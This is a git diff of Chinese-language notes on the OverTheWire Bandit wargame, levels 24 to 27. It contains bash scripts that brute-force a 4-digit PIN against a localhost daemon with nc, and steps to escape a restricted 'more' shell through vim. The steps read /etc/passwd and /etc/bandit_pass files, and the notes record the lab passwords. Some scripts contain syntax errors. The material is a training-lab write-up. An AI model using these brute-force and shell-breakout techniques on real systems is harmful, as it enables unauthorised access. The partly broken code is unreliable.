@@ -859,132 +859,158 @@ ssh
   
   - vim shell.sh
     
-    - ```vim
+    - ```shell
       for ((i=1000;i<10000;i++));do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> pingcode.txt;done
       
-      ### nc localhost -p 30002 < pingcode.txt
-      
-      cat ./pingcode.txt | nc localhost -p 30002 >> ./bandit24pass
-      echo -e ./pingcode.txt | nc localhost -p 30002 >> ./bandit24pass
-      echo -e "$BANDIT24_PASS $PIN" | nc localhost 30002 >> ./bandit242pass
-      
       #!/bin/bash  
-      
-      # 假设你已经有了bandit24的密码  
       BANDIT24_PASS="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"  
       
-      # 尝试从0000到9999的所有PIN码  
       for PIN in {0000..9999}  
       do  
-          # 使用netcat与守护进程通信  
-          # 注意：这取决于守护进程的具体行为，可能需要调整  
-          RESPONSE=$(echo -e "$BANDIT24_PASS $PIN" | nc localhost 30002)  
-      
-          # 检查响应中是否包含"correct"或类似的消息  
-          if [[ $RESPONSE == *"orrect"* ]]; then  
+          RESPONSE=$(echo "$BANDIT24_PASS $PIN" | nc localhost 30002)  
+          if [[ $RESPONSE == *"Correct"* ]]  
+          then  
               echo "Found the PIN: $PIN"  
               echo "The response from the daemon is: $RESPONSE"  
-              # 这里可以添加逻辑来提取并打印bandit25的密码（如果它在响应中）  
-              break  # 退出循环  
+              break  
+          elif [[ $RESPONSE == *"Wrong"* ]]  # 假设响应中可能包含 "Wrong"  
+          then  
+              echo "The PIN $PIN is wrong."  
           fi  
-      done
       
-      
-      
-      
-      from pwn import *
-      
-      conn = remote('localhost', '30002')
-      badline = conn.recvline()
-      for i in range(10000):
-          tmp = str(i).zfill(4)
-          print ('[+] Trying pincode: ' + str(tmp))
-          conn.sendline('VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ' + tmp)
-          response = conn.recvline()
-          print(response)
-          if b'Wrong! Please enter the correct pincode. Try again.' not in response:
-              print('[+] Found pincode: ' + str(tmp))
-               break
-      
-      
-       for i in {0000..9999};do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i;done | nc localhost 30002
-      
-      
-      
-      
-      #!/bin/bash  
-      
-      # 假设你已经有了bandit24的密码  
-      BANDIT24_PASS="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"  
-      
-      # 尝试从0000到9999的所有PIN码  
-      for PIN in {0000..9999}  
-      do  
-          # 使用netcat与守护进程通信  
-          # 注意：这取决于守护进程的具体行为，可能需要调整  
-          RESPONSE=$(echo "$BANDIT24_PASS $PIN" | nc localhost 30002)  
-      
-          # 检查响应中是否包含"correct"或类似的消息  
-          if [[ $RESPONSE == *"orrect"* || $PIN%500 == 0]]; then  
-              echo "Found the PIN: $PIN"  
-              echo "The response from the daemon is: $RESPONSE"
+          # 每1000次迭代后暂停2秒（注意：是从0开始计数的，所以应该是 % 1000 == 0）  
+          if (( $PIN % 1000 == 0 )); then  
               sleep 2  
-              # 这里可以添加逻辑来提取并打印bandit25的密码（如果它在响应中）  
-              break  # 退出循环  
           fi  
       done
-      
-      
-      
-      
-      echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000 | nc localhost 30002
-      printf VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000 | nc localhost 30002
-      
-      
-      str="Hello, abc is here."  
-      if [[ "$str" =~ abc ]]; then  
-          echo "String contains 'abc'."  
-      else  
-          echo "String does not contain 'abc'."  
-      fi
-      
-      
-      str="Hello, abc is here."  
-      if echo "$str" | grep -q "abc"; then  
-          echo "String contains 'abc'."  
-      else  
-          echo "String does not contain 'abc'."  
-      fi
       ```
 
-      from pwn import *
+- ```a.sh
+  -----实际可行 创建两个sh文件，拆开查询
+  #!/bin/bash 
+  BANDIT24_PASS="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"  
+  set t 1
+  for PIN in {0000..9999}  
+  do  
+     if (( $PIN % 500 == 0 )); then  
+          ((t++))
+          touch "res$t" 
+      fi   
+  echo "$BANDIT24_PASS $PIN" >> "res$t"
+  done
+  ```
+
+- ```shell
+  #!/bin/bash  
+  fo((i=1; i<=100; i++))
+  do
+      cat "res$i" | nc localhost 30002 >> ans
+      sleep 2
+  done
+  ```
+
+- ```shell
+  #!/bin/bash 
+  BANDIT24_PASS="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"  
+  set t 1
+  for PIN in {0000..9999}  
+  do  
+     if (( $PIN % 500 == 0 )); then  
+          ((t++))
+          touch "res$t" 
+      fi   
+  echo "$BANDIT24_PASS $PIN" >> "res$t"
+  done
+  ```
+
+- 获得所有结果存到ans文件中
+
+- grep -A 2 "Correct!" ans
+
+-     -A 查询之后 。-B查询之前
+
+- 获得密码：p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+## lv25-26
+
+* 目标：
+  * Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+* 命令学习：
+  
+  * ssh, cat, more, vi, ls, id, pwd
+  * more
+    * 分页显示文本文件的内容  
+      原文链接：[more命令 &#8211; 分页显示文本文件内容 &#8211; Linux命令大全(手册)](https://www.linuxcool.com/more)
+    * more 参数 文件名  
+    * 
+      
+  * vim
+    * ：ex 使用ex底层编辑模式  
+      
+
+* 解题步骤：
+  
+  * ssh -p 2220 bandit25@bandit.labs.overthewire.org
+     p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+  
+  * ssh bandit26@localhost -i bandit26.sshkey -p 2220
+  
+  * 知识点：/etc/passwd目录
+  
+  * cat /etc/passwd | grep bandit26
     
-      r = remote('localhost', 30002)
-      for i in range(0, 10):
-          for j in range(0, 10):
-              for k in range(0, 10):
-                  for p in range(0, 10):
-                      flag = str(i) + str(j) + str(k) + str(p)
-                      s = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar "+ flag
-                      r.sendline(s)
-                      response = r.recvline()
-                      if 'Wrong!' not in response:
-                          print 'Correct! ' + responsee
+    * bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+  
+  * cat /usr/bin/showtext
     
-      ```
+    * #!/bin/sh
+      
+      export TERM=linux
+      
+      exec more ~/text.txt
+      exit 0
+    
+    * **more**指令，该指令是一个文本过滤器在终端界面足够小到只能显示一行的时候起作用，
+  
+  * 拉小终端后执行：ssh bandit26@localhost -i bandit26.sshkey -p 2220
+  
+  * esc后输入：进入vim命令模式，输入:e /etc/bandit_pass/bandit26
+  
+  * 获得密码：c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
 
-- ./shell.sh
-
-- 获得密码：
-
-# 模板
+## # lv26-27
 
 - 目标：
+  
+  - Good job getting a shell! Now hurry and grab the password for bandit27!
 
 - 命令学习：
+  
+  - ls
 
 - 解题步骤：
   
   - ssh -p 2220 bandit2 bandit.labs.overthewire.org
   
   - 获得密码：
+
+# 模板
+
+* 目标：
+
+* 命令学习：
+
+* 解题步骤：
+  
+  * 进入上关文本内基础上，进入vim命令模式，输入 set sh=/bin/sh
+  
+  * vim命令模式输入：sh  从vim中进入shell界面
+  
+  * ls -la
+    
+    * 发现bandit27-do是可执行文件
+  
+  * ./bandit27-do cat /etc/bandit_pass/bandit27
+  
+  * 获得密码：YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
